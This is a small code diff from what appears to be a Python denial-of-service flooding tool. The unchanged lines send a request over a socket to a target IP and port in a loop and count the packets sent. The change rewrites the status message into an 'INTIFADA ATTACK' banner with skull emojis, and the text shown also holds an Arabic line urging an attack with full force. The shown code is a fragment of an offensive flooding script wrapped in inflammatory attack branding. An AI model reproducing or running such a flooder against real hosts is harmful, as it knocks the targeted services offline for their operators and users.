@@ -70,7 +70,7 @@ def start():
             for i in range(pack):
                 s.send(str.encode(main_req))
             xx += random.randint(0, int(pack))
-            print("Menyerang {0}:{1} | kirim: {2}".format(str(ip), int(port), xx))
+            print("INTIFADA ATTACK {0}:{1} --->>> kirim ☠️☠️☠️☠️☠️: {2}".format(str(ip), int(port), xx))
         except:
             s.close()
             print('الهجوم بكل قوتك... Intifada ATTACK --------->>>>>>>>>>>> ☠️☠️☠️☠️☠️☠️☠️☠️☠️')
